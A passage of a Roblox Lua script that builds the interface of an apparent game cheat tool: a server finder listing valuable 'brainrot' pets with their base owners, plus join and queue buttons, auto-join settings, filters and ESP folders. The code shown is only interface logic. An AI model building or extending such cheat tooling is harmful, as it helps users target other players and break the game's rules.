DockLogo.ScaleType = Enum.ScaleType.Fit
DockLogo.Size = UDim2.new(0, 28, 0, 28)
DockLogo.ZIndex = 10
DockLogo.Parent = DockPanelBtn

DockAJBtn = dockButton(55)
label(DockAJBtn, "AJ", 13, T.textHi, {
    align = Enum.TextXAlignment.Center, z = 10, fontFace = F.builder, weight = "Bold",
})



Floating = Instance.new("Frame")
Floating.Name = "Floating"
Floating.BackgroundTransparency = 1
Floating.Size = UDim2.new(1, 0, 1, 0)
Floating.Visible = false
Floating.ZIndex = 7
Floating.Parent = ScreenGui

local function floatingButton(name, yPos, text)
    local b = Instance.new("TextButton")
    b.Name = name
    b.AutoButtonColor = false
    b.Active = true
    b.BackgroundColor3 = T.panelBg
    b.BackgroundTransparency = 0.04
    b.BorderSizePixel = 0
    b.AnchorPoint = Vector2.new(1, 1)
    b.Position = UDim2.new(1, -16, 1, yPos)
    b.Size = UDim2.new(0, 48, 0, 48)
    b.Text = text or ""
    b.TextColor3 = T.textHi
    b.TextSize = 14
    b.FontFace = font(F.builder, "Bold")
    b.ZIndex = 7
    b.Parent = Floating
    corner(b, 24)
    stroke(b, T.textHi, 1.2, 0.5)
    
    local dragging, dragStart, startPos
    b.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = b.Position
        end
    end)
    b.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
            or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
            local d = input.Position - dragStart
            b.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X,
                startPos.Y.Scale, startPos.Y.Offset + d.Y)
        end
    end)
    return b
end

FloatPanelBtn = floatingButton("PanelBtn", -16, "")
local FloatPanelLogo = Instance.new("ImageLabel")
FloatPanelLogo.AnchorPoint = Vector2.new(0.5, 0.5)
FloatPanelLogo.Image = "rbxthumb://type=Asset&id=161110078&w=150&h=150"
FloatPanelLogo.BackgroundTransparency = 1
FloatPanelLogo.Position = UDim2.new(0.5, 0, 0.5, 0)
FloatPanelLogo.ScaleType = Enum.ScaleType.Fit
FloatPanelLogo.Size = UDim2.new(0, 28, 0, 28)
FloatPanelLogo.ZIndex = 8
FloatPanelLogo.Parent = FloatPanelBtn
FloatAJBtn = floatingButton("AJBtn", -76, "AJ")



local Pages = Instance.new("Frame")
Pages.Name = "Pages"
Pages.BackgroundTransparency = 1
Pages.LayoutOrder = 3
Pages.Position = UDim2.new(0, 0, 0, 46)
Pages.Size = UDim2.new(1, 0, 1, -92)
Pages.Parent = Content

FinderPage = Instance.new("Frame")
FinderPage.Name = "FinderPage"
FinderPage.BackgroundTransparency = 1
FinderPage.Size = UDim2.new(1, 0, 1, 0)
FinderPage.Parent = Pages

FiltersPage = Instance.new("Frame")
FiltersPage.Name = "FiltersPage"
FiltersPage.BackgroundTransparency = 1
FiltersPage.Size = UDim2.new(1, 0, 1, 0)
FiltersPage.Visible = false
FiltersPage.Parent = Pages

SettingsPage = Instance.new("Frame")
SettingsPage.Name = "SettingsPage"
SettingsPage.BackgroundTransparency = 1
SettingsPage.Size = UDim2.new(1, 0, 1, 0)
SettingsPage.Visible = false
SettingsPage.Parent = Pages


PeerESP = Instance.new("Folder")
PeerESP.Name = "PeerESP"
PeerESP.Parent = ScreenGui

TeamTags = Instance.new("Folder")
TeamTags.Name = "TeamTags"
TeamTags.Parent = ScreenGui




local COLS = {
    { name = "Brainrot",    w = 166, align = Enum.TextXAlignment.Left },
    { name = "Generation",  w = 84,  align = Enum.TextXAlignment.Right },
    { name = "Players",     w = 54,  align = Enum.TextXAlignment.Center },
    { name = "Region",      w = 48,  align = Enum.TextXAlignment.Center },
    { name = "Base Owner",  w = 102, align = Enum.TextXAlignment.Left },
    { name = "Age",         w = 36,  align = Enum.TextXAlignment.Center },
    { name = "",            w = 104, align = Enum.TextXAlignment.Center },
}

local HeaderRow = Instance.new("Frame")
HeaderRow.Name = "HeaderRow"
HeaderRow.BackgroundTransparency = 1
HeaderRow.Size = UDim2.new(1, -30, 0, 30)
HeaderRow.Parent = FinderPage

local HeaderList = Instance.new("UIListLayout")
HeaderList.FillDirection = Enum.FillDirection.Horizontal
HeaderList.SortOrder = Enum.SortOrder.LayoutOrder
HeaderList.Parent = HeaderRow

for i, col in ipairs(COLS) do
    local cell = Instance.new("Frame")
    cell.BackgroundTransparency = 1
    cell.LayoutOrder = i
    cell.Size = UDim2.new(0, col.w, 0, 30)
    cell.Parent = HeaderRow
    label(cell, col.name, 12, T.textLow, {
        align = col.align, fontFace = F.builder, weight = "SemiBold",
    })
end


local ChipRow = Instance.new("Frame")
ChipRow.Name = "ChipRow"
ChipRow.BackgroundTransparency = 1
ChipRow.Position = UDim2.new(0, 0, 0, 26)
ChipRow.Size = UDim2.new(1, -30, 0, 26)
ChipRow.Parent = FinderPage

local ChipList = Instance.new("UIListLayout")
ChipList.FillDirection = Enum.FillDirection.Horizontal
ChipList.Padding = UDim.new(0, 8)
ChipList.VerticalAlignment = Enum.VerticalAlignment.Center
ChipList.SortOrder = Enum.SortOrder.LayoutOrder
ChipList.Parent = ChipRow

local function chip(text, order, w)
    local b = button(ChipRow, {
        bg = T.chipBg, text = text, order = order, rich = true,
        dim = UDim2.new(0, w, 0, 22), size = 11, color = T.textMid,
        fontFace = F.builder, weight = "Medium", corner = 6,
    })
    return b
end

MIN_STEPS = { 0, 10000000, 25000000, 50000000, 100000000, 250000000, 500000000 }
local MinChip = chip("Min:;$0", 1, 92)
local SortChip = chip("Sort:;Newest", 2, 96)

local HideFullChip = button(ChipRow, {
    bg = T.chipBg, order = 3, dim = UDim2.new(0, 0, 0, 22),
    autoSize = Enum.AutomaticSize.X, corner = 6,
})
local HideFullInner = Instance.new("Frame")
HideFullInner.BackgroundTransparency = 1
HideFullInner.Size = UDim2.new(0, 0, 1, 0)
HideFullInner.AutomaticSize = Enum.AutomaticSize.X
HideFullInner.Parent = HideFullChip
local HideFullList = Instance.new("UIListLayout")
HideFullList.FillDirection = Enum.FillDirection.Horizontal
HideFullList.Padding = UDim.new(0, 6)
HideFullList.VerticalAlignment = Enum.VerticalAlignment.Center
HideFullList.SortOrder = Enum.SortOrder.LayoutOrder
HideFullList.Parent = HideFullInner
local HideFullPad = Instance.new("UIPadding")
HideFullPad.PaddingLeft = UDim.new(0, 8)
HideFullPad.PaddingRight = UDim.new(0, 8)
HideFullPad.Parent = HideFullChip

local HideCheckBox = Instance.new("Frame")
HideCheckBox.BackgroundColor3 = T.panelBg
HideCheckBox.BorderSizePixel = 0
HideCheckBox.LayoutOrder = 1
HideCheckBox.Size = UDim2.new(0, 16, 0, 16)
HideCheckBox.Parent = HideFullInner
corner(HideCheckBox, 4)
stroke(HideCheckBox, T.divider, 1, 0)
local HideCheckMark = Instance.new("ImageLabel")
HideCheckMark.Image = "rbxassetid://7733715400"
HideCheckMark.ImageColor3 = Color3.new(1, 1, 1)
HideCheckMark.BackgroundTransparency = 1
HideCheckMark.Position = UDim2.new(0, 2, 0, 2)
HideCheckMark.Visible = false
HideCheckMark.Size = UDim2.new(1, -3, 1, -3)
HideCheckMark.Parent = HideCheckBox
label(HideFullInner, "Hide full", 11, T.textMid, {
    order = 2, autoSize = Enum.AutomaticSize.X, size = UDim2.new(0, 0, 1, 0),
    fontFace = F.builder, weight = "Medium",
})

function refreshChips()
    MinChip.Text = "Min:;" .. (Settings.minGen > 0 and formatIncomeShort(Settings.minGen) or "$0")
    SortChip.Text = "Sort:;" .. State.sort
    HideCheckBox.BackgroundColor3 = State.hideFull and T.accent or T.panelBg
    HideCheckMark.Visible = State.hideFull
end


ListFrame = Instance.new("ScrollingFrame")
ListFrame.Name = "Listings"
ListFrame.ScrollBarImageColor3 = T.divider
ListFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
ListFrame.BackgroundTransparency = 1
ListFrame.Position = UDim2.new(0, 0, 0, 56)
ListFrame.AutomaticCanvasSize = Enum.AutomaticSize.Y
ListFrame.ScrollBarThickness = 0
ListFrame.BorderSizePixel = 0
ListFrame.Size = UDim2.new(1, -18, 1, -56)
ListFrame.Parent = FinderPage

local ListPad = Instance.new("UIPadding")
ListPad.PaddingRight = UDim.new(0, 6)
ListPad.Parent = ListFrame

local ListLayout = Instance.new("UIListLayout")
ListLayout.SortOrder = Enum.SortOrder.LayoutOrder
ListLayout.Padding = UDim.new(0, 2)
ListLayout.Parent = ListFrame

local function edgeFade(parent, top)
    local f = Instance.new("Frame")
    f.BackgroundTransparency = 1
    f.Position = top and UDim2.new(0, 0, 0, 56) or UDim2.new(0, 0, 1, -26)
    f.Size = UDim2.new(1, -18, 0, 26)
    f.ZIndex = 3
    f.Parent = parent
    local g = Instance.new("UIGradient")
    g.Rotation = top and 270 or 90
    g.Transparency = NumberSequence.new({
        NumberSequenceKeypoint.new(0, 1),
        NumberSequenceKeypoint.new(1, 0),
    })
    g.Parent = f
    local fill = Instance.new("Frame")
    fill.BackgroundColor3 = T.winBg
    fill.BorderSizePixel = 0
    fill.Size = UDim2.new(1, 0, 1, 0)
    fill.ZIndex = 2
    fill.Parent = f
    return f
end
edgeFade(FinderPage, true)
edgeFade(FinderPage, false)

local EmptyLabel = label(FinderPage, "No brainrots match", 15, T.textLow, {
    align = Enum.TextXAlignment.Center, pos = UDim2.new(0, 12, 0, 171),
    size = UDim2.new(1, -24, 0, 40), visible = false,
    fontFace = F.builder, weight = "Medium",
})
EmptyLabel.Visible = false



function listingPassesFilter(rec)
    if Settings.minGen > 0 and (rec.incomeUnknown or (rec.income or 0) < Settings.minGen) then
        return false
    end
    if State.hideFull and (rec.players or 0) >= (rec.maxPlayers or 8) then
        return false
    end
    if State.region ~= "All" then
        local want = ({ ["🇺🇸"] = "US", ["🇪🇺"] = "EU", ["🇻🇳"] = "VN" })[State.region]
        if tostring(rec.region or ""):upper() ~= want then
            return false
        end
    end
    if State.search ~= "" then
        local s = State.search:lower()
        if not tostring(rec.pet or ""):lower():find(s, 1, true)
            and not tostring(rec.owner or ""):lower():find(s, 1, true) then
            return false
        end
    end
    if Settings.petFilter then
        local any = false
        for name, sel in pairs(Settings.petSelection) do
            if sel then any = true break end
        end
        if any and not Settings.petSelection[rec.pet] then
            return false
        end
    end
    for _, bl in ipairs(Settings.blacklist) do
        if tostring(rec.owner or ""):lower() == tostring(bl):lower() then
            return false
        end
    end
    return true
end

function isOG(rec)
    for _, n in ipairs(OG_BRAINROTS) do
        if rec.pet == n then return true end
    end
    return false
end

function isSpecial(rec)
    return Settings.specialList[rec.pet] == true
end

local rowOrder = 0
local function buildRow(rec)
    local row = Instance.new("Frame")
    row.Name = "Row_" .. tostring(rec.listingId):sub(1, 8)
    row.BackgroundColor3 = T.chipBg
    row.BackgroundTransparency = 0.35
    row.BorderSizePixel = 0
    row.Size = UDim2.new(1, 0, 0, 36)
    row.ZIndex = 1
    row.Parent = ListFrame
    corner(row, 9)

    local rowList = Instance.new("UIListLayout")
    rowList.FillDirection = Enum.FillDirection.Horizontal
    rowList.SortOrder = Enum.SortOrder.LayoutOrder
    rowList.Parent = row

    
    local accent = Instance.new("Frame")
    accent.BackgroundColor3 = isSpecial(rec) and T.goldDot or T.rowBlue
    accent.BorderSizePixel = 0
    accent.Position = UDim2.new(0, 4, 0.5, -8)
    accent.Size = UDim2.new(0, 3, 0, 16)
    accent.ZIndex = 2
    accent.Parent = row
    corner(accent, 2)

    local cells = {}
    for i, col in ipairs(COLS) do
        local cell = Instance.new("Frame")
        cell.BackgroundTransparency = 1
        cell.LayoutOrder = i
        cell.Size = UDim2.new(0, col.w, 0, 36)
        cell.ZIndex = 2
        cell.Parent = row
        cells[i] = cell
    end

    
    local nameLabel = label(cells[1], rec.pet or "?", 13, T.textHi, {
        rich = true, truncate = Enum.TextTruncate.AtEnd, z = 2,
        fontFace = F.builder, weight = "SemiBold",
    })
    local namePad = Instance.new("UIPadding")
    namePad.PaddingLeft = UDim.new(0, 14)
    namePad.Parent = cells[1]

    
    local genLabel = label(cells[2], formatIncome(rec.income, rec.incomeUnknown), 13, T.textMid, {
        align = Enum.TextXAlignment.Right, z = 2, truncate = Enum.TextTruncate.AtEnd,
        fontFace = F.builder, weight = "Medium",
    })

    local playersLabel = label(cells[3], (rec.players or 0) .. "/" .. (rec.maxPlayers or 8), 13,
        (rec.players or 0) >= (rec.maxPlayers or 8) and T.errorRed or T.textMid, {
        align = Enum.TextXAlignment.Center, z = 2, fontFace = F.builder, weight = "Medium",
    })

    local regionLabel = label(cells[4], flagOf(rec.region), 20, T.textHi, {
        align = Enum.TextXAlignment.Center, z = 2,
    })

    local ownerLabel = label(cells[5], rec.owner or "Unknown", 13, T.textMid, {
        truncate = Enum.TextTruncate.AtEnd, z = 2, fontFace = F.builder, weight = "Medium",
    })
    local ownerSize = Instance.new("UISizeConstraint")
    ownerSize.MaxSize = Vector2.new(102, math.huge)
    ownerSize.Parent = ownerLabel

    local ageLabel = label(cells[6], formatAge(rec.addedAt), 12, T.textLow, {
        align = Enum.TextXAlignment.Center, z = 2, fontFace = F.builder, weight = "Medium",
    })

    
    local full = (rec.players or 0) >= (rec.maxPlayers or 8)
    local joinBtn = button(cells[7], {
        bg = T.chipBg, pos = UDim2.new(1, -50, 0.5, -13), dim = UDim2.new(0, 50, 0, 26),
        corner = 6, z = 3,
    })
    stroke(joinBtn, T.divider, 1, 0.4)
    local joinDot = Instance.new("Frame")
    joinDot.BackgroundColor3 = full and T.queueGold or T.goldDot
    joinDot.BorderSizePixel = 0
    joinDot.Position = UDim2.new(0, 8, 0.5, -2)
    joinDot.Size = UDim2.new(0, 5, 0, 5)
    joinDot.ZIndex = 4
    joinDot.Parent = joinBtn
    corner(joinDot, 3)
    label(joinBtn, full and "Queue" or "Join", 13, T.textHi, {
        align = Enum.TextXAlignment.Center, font = Enum.Font.SourceSansBold, z = 4,
    })
    joinBtn.MouseButton1Click:Connect(function()
        joinListing(rec, false)
    end)

    
    local queueBtn = button(cells[7], {
        bg = Settings.ajQueueOGOnly and T.queueGold or T.selectBlue,
        pos = UDim2.new(1, -104, 0.5, -13), dim = UDim2.new(0, 50, 0, 26),
        corner = 6, z = 3,
    })
    queueBtn.Visible = false
    local queueStroke = stroke(queueBtn,
        Settings.ajQueueOGOnly and T.queueGold or T.selectBlue, 1, 0.15)
    label(queueBtn, "Queue", 13, T.linkBlue, {
        align = Enum.TextXAlignment.Center, font = Enum.Font.SourceSansBold, z = 4,
    })
    queueBtn.MouseButton1Click:Connect(function()
        joinListing(rec, true)
    end)
    if full and Settings.ajQueueJoin then
        queueBtn.Visible = true
    end

    
    row.MouseEnter:Connect(function()
        tween(row, 0.16, { BackgroundTransparency = 0 })
    end)
    row.MouseLeave:Connect(function()
        tween(row, 0.16, { BackgroundTransparency = 0.35 })
    end)

    
    if isOG(rec) then
        local shim = Instance.new("UIGradient")
        shim.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(28, 28, 0)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(28, 28, 0)),
        })
        shim.Parent = row
        State.shimmers = State.shimmers or {}
        table.insert(State.shimmers, { grad = shim, row = row, off = math.random() })
    end

    local rowData = {
        frame = row, rec = rec, age = ageLabel, gen = genLabel,
        players = playersLabel, name = nameLabel, owner = ownerLabel,
        join = joinBtn, queue = queueBtn,
    }
    row.Destroying:Connect(function()
        if State.rows[rec.listingId] == rowData then
            State.rows[rec.listingId] = nil
        end
    end)
    return rowData
end

local function updateRow(rd, rec)
    rd.rec = rec
    local mut = rec.mutation and rec.mutation ~= "None" and rec.mutation ~= ""
    rd.name.Text = tostring(rec.pet or "?") .. (mut
        and " <font color=\"#A6A6B0\">" .. tostring(rec.mutation) .. "</font>" or "")
    rd.gen.Text = formatIncome(rec.income, rec.incomeUnknown)
    rd.players.Text = (rec.players or 0) .. "/" .. (rec.maxPlayers or 8)
    rd.players.TextColor3 = (rec.players or 0) >= (rec.maxPlayers or 8) and T.errorRed or T.textMid
    rd.owner.Text = rec.owner or "Unknown"
    rd.age.Text = formatAge(rec.addedAt)
end

function refreshListings()
    if State.page ~= "Finder" then return end
    
    local list = {}
    for id, rec in pairs(State.listings) do
        if listingPassesFilter(rec) then
            table.insert(list, rec)
        end
    end
    table.sort(list, function(a, b)
        if State.sort == "Income" then
            return (a.income or 0) > (b.income or 0)
        end
        return (a.addedAt or 0) > (b.addedAt or 0)
    end)
    
    local MAX_ROWS = 120
    local keep = {}
    for i, rec in ipairs(list) do
        if i > MAX_ROWS then break end
        keep[rec.listingId] = true
        local rd = State.rows[rec.listingId]
        if rd then
            updateRow(rd, rec)
        else
            State.rows[rec.listingId] = buildRow(rec)
        end
        rowOrder = rowOrder + 1
        State.rows[rec.listingId].frame.LayoutOrder = rowOrder
    end
    
    for id, rd in pairs(State.rows) do
        if not keep[id] then
            rd.frame:Destroy()
            State.rows[id] = nil
        end
    end
    EmptyLabel.Visible = #list == 0
    StatsLabel.Text = string.format("%d brainrots · %d servers",
        #list, State.stats.tracked or 0)
end

function scheduleRefresh()
    State.refreshPending = true
end


local lastTick = 0
RunService.RenderStepped:Connect(function(dt)
    if State.shimmers then
        for _, s in ipairs(State.shimmers) do
            if s.row and s.row.Parent then
                local t = (os.clock() * 0.5 + s.off) % 1
                pcall(function() s.grad.Offset = Vector2.new(t * 2 - 1, 0) end)
            end
        end
    end
    lastTick = lastTick + dt
    if lastTick >= 1 then
        lastTick = 0
        for _, rd in pairs(State.rows) do
            if rd.rec then
                rd.age.Text = formatAge(rd.rec.addedAt)
            end
        end
        if State.shimmers then
            local live = {}
            for _, s in ipairs(State.shimmers) do
                if s.row and s.row.Parent then table.insert(live, s) end
            end
            State.shimmers = live
        end
        if State.refreshPending then
            State.refreshPending = false
            refreshListings()
        end
    end
end)


MinChip.MouseButton1Click:Connect(function()
    local idx = 1
    for i, v in ipairs(MIN_STEPS) do
        if v == Settings.minGen then idx = i break end
    end
    Settings.minGen = MIN_STEPS[(idx % #MIN_STEPS) + 1]
    saveSettings()
    refreshChips()
    scheduleRefresh()
end)

SortChip.MouseButton1Click:Connect(function()
    State.sort = State.sort == "Newest" and "Income" or "Newest"
    refreshChips()
    scheduleRefresh()
end)

HideFullChip.MouseButton1Click:Connect(function()
    State.hideFull = not State.hideFull
    Settings.barHideFull = State.hideFull
    saveSettings()
    refreshChips()
    scheduleRefresh()
end)

SearchInput:GetPropertyChangedSignal("Text"):Connect(function()
    State.search = SearchInput.Text
    scheduleRefresh()
end)

for r, rb in pairs(regionButtons) do
    rb.MouseButton1Click:Connect(function()
        setRegion(r)
    end)
end




local CatBox = Instance.new("Frame")
CatBox.Name = "CatBox"
CatBox.BackgroundColor3 = T.btnBg
CatBox.BorderSizePixel = 0
CatBox.Position = UDim2.new(0, 12, 0, 10)
CatBox.Size = UDim2.new(0, 236, 0, 32)
CatBox.Parent = FiltersPage
corner(CatBox, 9)

local CatPill = Instance.new("Frame")
CatPill.BackgroundColor3 = T.panelBg
CatPill.BorderSizePixel = 0
CatPill.Position = UDim2.new(0, 2, 0, 2)
CatPill.Size = UDim2.new(0.25, -4, 1, -4)
CatPill.ZIndex = 2
CatPill.Parent = CatBox
corner(CatPill, 7)

local CATS = { "OG", "Secret", "Eggs", "Other" }
local catButtons = {}
for i, c in ipairs(CATS) do
    local cb = button(CatBox, {
        bg = T.btnBg, bgTrans = 1, text = c, z = 3, corner = false,
        pos = UDim2.new(0.25 * (i - 1), 0, 0, 0), dim = UDim2.new(0.25, 0, 1, 0),
        size = 13, fontFace = F.builder, weight = "Bold", color = T.textMid,
    })
    catButtons[c] = cb
    cb.MouseButton1Click:Connect(function()
        Settings.filterCategory = c
        saveSettings()
        tween(CatPill, 0.16, { Position = UDim2.new(0.25 * (i - 1), 2, 0, 2) })
        for name, b in pairs(catButtons) do
            b.TextColor3 = name == c and T.textHi or T.textMid
        end
        rebuildFilterList()
    end)
end


local FilterSearch = Instance.new("Frame")
FilterSearch.BackgroundColor3 = T.panelBg
FilterSearch.BorderSizePixel = 0
FilterSearch.Position = UDim2.new(0, 260, 0, 10)
FilterSearch.Size = UDim2.new(0, 160, 0, 32)
FilterSearch.Parent = FiltersPage
corner(FilterSearch, 8)
local FilterSearchInput = Instance.new("TextBox")
FilterSearchInput.Text = ""
FilterSearchInput.TextColor3 = T.textHi
FilterSearchInput.ClearTextOnFocus = false
FilterSearchInput.TextXAlignment = Enum.TextXAlignment.Left
FilterSearchInput.Font = Enum.Font.GothamMedium
FilterSearchInput.BackgroundTransparency = 1
FilterSearchInput.PlaceholderColor3 = T.textMid
FilterSearchInput.PlaceholderText = "Search"
FilterSearchInput.Position = UDim2.new(0, 10, 0, 0)
FilterSearchInput.TextSize = 13
FilterSearchInput.Size = UDim2.new(1, -20, 1, 0)
FilterSearchInput.Parent = FilterSearch


local ModeBox = Instance.new("Frame")
ModeBox.BackgroundColor3 = T.btnBg
ModeBox.BorderSizePixel = 0
ModeBox.Position = UDim2.new(0, 12, 0, 49)
ModeBox.Size = UDim2.new(0, 140, 0, 32)
ModeBox.Parent = FiltersPage
corner(ModeBox, 9)

local ModePill = Instance.new("Frame")
ModePill.BackgroundColor3 = T.panelBg
ModePill.BorderSizePixel = 0
ModePill.Position = UDim2.new(0, 2, 0, 2)
ModePill.Size = UDim2.new(0.5, -4, 1, -4)
ModePill.ZIndex = 2
ModePill.Parent = ModeBox
corner(ModePill, 7)

local modeButtons = {}
for i, mname in ipairs({ "Filter", "Special" }) do
    local mb = button(ModeBox, {
        bg = T.btnBg, bgTrans = 1, text = mname, z = 3, corner = false,
        pos = UDim2.new(0.5 * (i - 1), 0, 0, 0), dim = UDim2.new(0.5, 0, 1, 0),
        size = 13, fontFace = F.builder, weight = "Bold", color = T.textMid,
    })
    modeButtons[mname] = mb
    mb.MouseButton1Click:Connect(function()
        Settings.filterMode = mname
        saveSettings()
        tween(ModePill, 0.16, { Position = UDim2.new(0.5 * (i - 1), 2, 0, 2) })
        for n2, b2 in pairs(modeButtons) do
            b2.TextColor3 = n2 == mname and T.textHi or T.textMid
        end
        rebuildFilterList()
    end)
end

local SelectAllBtn = button(FiltersPage, {
    bg = T.chipBg, text = "Select all", pos = UDim2.new(0, 164, 0, 49),
    dim = UDim2.new(0, 0, 0, 32), autoSize = Enum.AutomaticSize.X,
    size = 12, color = T.textMid, fontFace = F.builder, weight = "SemiBold",
})
local SelectAllPad = Instance.new("UIPadding")
SelectAllPad.PaddingLeft = UDim.new(0, 12)
SelectAllPad.PaddingRight = UDim.new(0, 12)
SelectAllPad.Parent = SelectAllBtn

local ClearBtn = button(FiltersPage, {
    bg = T.chipBg, text = "Clear", pos = UDim2.new(0, 268, 0, 49),
    dim = UDim2.new(0, 0, 0, 32), autoSize = Enum.AutomaticSize.X,
    size = 12, color = T.textMid, fontFace = F.builder, weight = "SemiBold",
})
local ClearPad = Instance.new("UIPadding")
ClearPad.PaddingLeft = UDim.new(0, 12)
ClearPad.PaddingRight = UDim.new(0, 12)
ClearPad.Parent = ClearBtn

label(FiltersPage, "Select brainrots to show only those in Finder and Auto Join", 12, T.textLow, {
    pos = UDim2.new(0, 14, 0, 86), size = UDim2.new(1, -28, 0, 18),
    fontFace = F.builder, weight = "Medium",
})


local CheckScroll = Instance.new("ScrollingFrame")
CheckScroll.Name = "PetList"
CheckScroll.ScrollBarImageColor3 = T.divider
CheckScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
CheckScroll.BackgroundTransparency = 1
CheckScroll.Position = UDim2.new(0, 12, 0, 111)
CheckScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
CheckScroll.ScrollBarThickness = 4
CheckScroll.VerticalScrollBarInset = Enum.ScrollBarInset.Always
CheckScroll.BorderSizePixel = 0
CheckScroll.Size = UDim2.new(1, -24, 1, -111)
CheckScroll.Parent = FiltersPage

local CheckLayout = Instance.new("UIListLayout")
CheckLayout.SortOrder = Enum.SortOrder.LayoutOrder
CheckLayout.Padding = UDim.new(0, 2)
CheckLayout.Parent = CheckScroll

local NoMatchLabel = label(FiltersPage, "No brainrots match", 15, T.textLow, {
    align = Enum.TextXAlignment.Center, pos = UDim2.new(0, 12, 0, 171),
    size = UDim2.new(1, -24, 0, 40), fontFace = F.builder, weight = "Medium",
})
NoMatchLabel.Visible = false

local CAT_LISTS = {
    OG = OG_BRAINROTS,
    Secret = SECRET_BRAINROTS,
    Eggs = EGG_BRAINROTS,
}

local function petInCategory(pet)
    local cat = Settings.filterCategory
    if cat == "Other" then
        for _, listName in ipairs({ "OG", "Secret", "Eggs" }) do
            for _, n in ipairs(CAT_LISTS[listName]) do
                if n == pet then return false end
            end
        end
        return true
    end
    for _, n in ipairs(CAT_LISTS[cat] or {}) do
        if n == pet then return true end
    end
    return false
end

function allPets()
    local set = {}
    for _, listName in ipairs({ "OG", "Secret", "Eggs" }) do
        for _, n in ipairs(CAT_LISTS[listName]) do set[n] = true end
    end
    for _, p in ipairs(SPECIAL_PRESETS) do set[p.name] = true end
    for _, rec in pairs(State.listings) do
        if rec.pet then set[rec.pet] = true end
    end
    local out = {}
    for n in pairs(set) do table.insert(out, n) end
    table.sort(out)
    return out
end

local checkRows = {}
function rebuildFilterList()
    for _, r in pairs(checkRows) do r:Destroy() end
    checkRows = {}
    local mode = Settings.filterMode
    local store = mode == "Special" and Settings.specialList or Settings.petSelection
    local search = (FilterSearchInput.Text or ""):lower()
    local shown = 0
    local order = 0
    for _, pet in ipairs(allPets()) do
        if petInCategory(pet) and (search == "" or pet:lower():find(search, 1, true)) then
            shown = shown + 1
            order = order + 1
            local r = button(CheckScroll, {
                bg = T.chipBg, bgTrans = 1, order = order,
                dim = UDim2.new(1, -8, 0, 28), corner = 6,
            })
            local rList = Instance.new("UIListLayout")
            rList.FillDirection = Enum.FillDirection.Horizontal
            rList.Padding = UDim.new(0, 8)
            rList.VerticalAlignment = Enum.VerticalAlignment.Center
            rList.SortOrder = Enum.SortOrder.LayoutOrder
            rList.Parent = r
            local rPad = Instance.new("UIPadding")
            rPad.PaddingLeft = UDim.new(0, 8)
            rPad.Parent = r
            local box = Instance.new("Frame")
            box.BackgroundColor3 = store[pet] and T.accent or T.panelBg
            box.BorderSizePixel = 0
            box.LayoutOrder = 1
            box.Size = UDim2.new(0, 16, 0, 16)
            box.Parent = r
            corner(box, 4)
            stroke(box, T.divider, 1, 0)
            local mark = Instance.new("ImageLabel")
            mark.Image = "rbxassetid://7733715400"
            mark.ImageColor3 = Color3.new(1, 1, 1)
            mark.BackgroundTransparency = 1
            mark.Position = UDim2.new(0, 2, 0, 2)
            mark.Visible = store[pet] and true or false
            mark.Size = UDim2.new(1, -3, 1, -3)
            mark.Parent = box
            local presetIncome
            for _, p in ipairs(SPECIAL_PRESETS) do
                if p.name == pet then presetIncome = p.income end
            end
            label(r, pet, 13, T.textHi, {
                order = 2, autoSize = Enum.AutomaticSize.X, size = UDim2.new(0, 0, 1, 0),
                fontFace = F.builder, weight = "Medium",
            })
            if presetIncome then
                label(r, formatIncomeShort(presetIncome), 12, T.statsGreen, {
                    order = 3, align = Enum.TextXAlignment.Right,
                    size = UDim2.new(1, -10, 1, 0), fontFace = F.builder, weight = "Medium",
                })
            end
            r.MouseButton1Click:Connect(function()
                store[pet] = not store[pet] or nil
                saveSettings()
                local on = store[pet] == true
                box.BackgroundColor3 = on and T.accent or T.panelBg
                mark.Visible = on
                scheduleRefresh()
            end)
            table.insert(checkRows, r)
        end
    end
    NoMatchLabel.Visible = shown == 0
end

FilterSearchInput:GetPropertyChangedSignal("Text"):Connect(function()
    rebuildFilterList()
end)

SelectAllBtn.MouseButton1Click:Connect(function()
    local store = Settings.filterMode == "Special" and Settings.specialList or Settings.petSelection
    local search = (FilterSearchInput.Text or ""):lower()
    for _, pet in ipairs(allPets()) do
        if petInCategory(pet) and (search == "" or pet:lower():find(search, 1, true)) then
            store[pet] = true
        end
    end
    saveSettings()
    rebuildFilterList()
    scheduleRefresh()
end)

ClearBtn.MouseButton1Click:Connect(function()
    local store = Settings.filterMode == "Special" and Settings.specialList or Settings.petSelection
    for k in pairs(store) do store[k] = nil end
    saveSettings()
    rebuildFilterList()
    scheduleRefresh()
end)



local SettingsNav = Instance.new("ScrollingFrame")
SettingsNav.Name = "SettingsNav"
SettingsNav.ScrollBarImageColor3 = T.divider
SettingsNav.CanvasSize = UDim2.new(0, 0, 0, 486)
SettingsNav.BackgroundTransparency = 1
SettingsNav.Position = UDim2.new(0, 6, 0, 8)
SettingsNav.AutomaticSize = Enum.AutomaticSize.None
SettingsNav.ScrollBarThickness = 4
SettingsNav.ScrollingDirection = Enum.ScrollingDirection.Y
SettingsNav.BorderSizePixel = 0
SettingsNav.Size = UDim2.new(0, 168, 1, -12)
SettingsNav.Parent = SettingsPage

local NavListFrame = Instance.new("Frame")
NavListFrame.BackgroundTransparency = 1
NavListFrame.Size = UDim2.new(1, -6, 0, 0)
NavListFrame.AutomaticSize = Enum.AutomaticSize.Y
NavListFrame.Parent = SettingsNav

local NavList = Instance.new("UIListLayout")
NavList.SortOrder = Enum.SortOrder.LayoutOrder
NavList.Parent = NavListFrame

local PANE_ICON = {
    General      = "rbxassetid://72727338348045",
    AutoJoin     = "rbxassetid://128849528093452",
    Blacklist    = "rbxassetid://73501670141022",
    Sound        = "rbxassetid://133324163109944",
    Teams        = "rbxthumb://type=Asset&id=16485180101&w=150&h=150",
    Keybinds     = "rbxassetid://140087399831489",
